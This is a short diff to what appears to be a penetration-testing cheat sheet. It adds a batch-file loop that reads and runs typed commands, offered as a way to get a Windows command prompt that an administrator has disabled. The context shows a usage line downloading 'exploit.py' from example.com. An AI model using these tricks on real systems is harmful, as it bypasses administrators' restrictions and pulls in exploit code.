@@ -65,3 +65,12 @@ function __curl() {
  
 # USAGE: __curl http://www.example.com/exploit.py > sploitz.py
 ```
+### Get cmd in Windows if not enabled by administrator
+- Create a file `something.bat` with following content
+```
+@echo off
+:a
+Set /p comm=cmd~
+%comm%
+Goto a
+```
